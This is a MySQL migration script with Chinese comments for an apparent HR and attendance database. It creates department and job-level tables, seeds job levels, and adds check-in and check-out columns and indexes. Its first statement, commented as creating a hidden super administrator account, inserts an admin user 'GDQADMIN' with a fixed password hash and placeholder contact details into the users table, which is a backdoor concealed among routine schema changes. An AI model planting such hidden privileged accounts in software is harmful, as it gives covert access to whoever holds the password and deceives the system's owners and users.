-- 1. 创建隐藏的超级管理员账号
INSERT INTO users (name, phone, password, role, status, email, created_at)
VALUES (
  'GDQADMIN',
  '00000000000',
  '$2a$10$8CubrrwlAHH539R5W.ihe.c3RnA1sxaAsHLlHyTJXSREmpNc3s9qG',
  'admin',
  'active',
  'gdqadmin@system.local',
  NOW()
) ON DUPLICATE KEY UPDATE name = name;

-- 2. 创建部门表（如果不存在）
CREATE TABLE IF NOT EXISTS departments (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(100) NOT NULL,
  parent_id INT DEFAULT NULL,
  level INT DEFAULT 1,
  manager_id INT DEFAULT NULL,
  sort_order INT DEFAULT 0,
  status ENUM('active','inactive') DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  FOREIGN KEY (parent_id) REFERENCES departments(id) ON DELETE SET NULL,
  FOREIGN KEY (manager_id) REFERENCES users(id) ON DELETE SET NULL
);

-- 3. 创建职级表（如果不存在）
CREATE TABLE IF NOT EXISTS job_levels (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(50) NOT NULL UNIQUE,
  level INT NOT NULL UNIQUE,
  description VARCHAR(200),
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- 插入默认职级
INSERT IGNORE INTO job_levels (name, level, description) VALUES
  ('总监', 5, '公司高层管理'),
  ('副总监', 4, '部门副职'),
  ('经理', 3, '部门负责人'),
  ('主管', 2, '团队负责人'),
  ('专员', 1, '普通员工');

-- 4. 扩展考勤表（检查字段是否存在后再添加）
-- 注意：MySQL的ALTER TABLE不支持IF NOT EXISTS，需要分别执行
SET @dbname = DATABASE();
SET @tablename = 'attendance';

-- 添加user_id字段
SET @col_exists = (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = @dbname AND TABLE_NAME = @tablename AND COLUMN_NAME = 'user_id');
SET @query = IF(@col_exists = 0,
  'ALTER TABLE attendance ADD COLUMN user_id INT DEFAULT NULL COMMENT ''打卡用户ID''',
  'SELECT ''user_id already exists'' AS msg');
PREPARE stmt FROM @query;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- 添加check_in_time字段
SET @col_exists = (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = @dbname AND TABLE_NAME = @tablename AND COLUMN_NAME = 'check_in_time');
SET @query = IF(@col_exists = 0,
  'ALTER TABLE attendance ADD COLUMN check_in_time DATETIME DEFAULT NULL COMMENT ''签到时间''',
  'SELECT ''check_in_time already exists'' AS msg');
PREPARE stmt FROM @query;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- 添加check_out_time字段
SET @col_exists = (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = @dbname AND TABLE_NAME = @tablename AND COLUMN_NAME = 'check_out_time');
SET @query = IF(@col_exists = 0,
  'ALTER TABLE attendance ADD COLUMN check_out_time DATETIME DEFAULT NULL COMMENT ''签退时间''',
  'SELECT ''check_out_time already exists'' AS msg');
PREPARE stmt FROM @query;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- 创建索引（忽略已存在的错误）
CREATE INDEX idx_attendance_user ON attendance(user_id);
CREATE INDEX idx_attendance_date ON attendance(check_in_time);
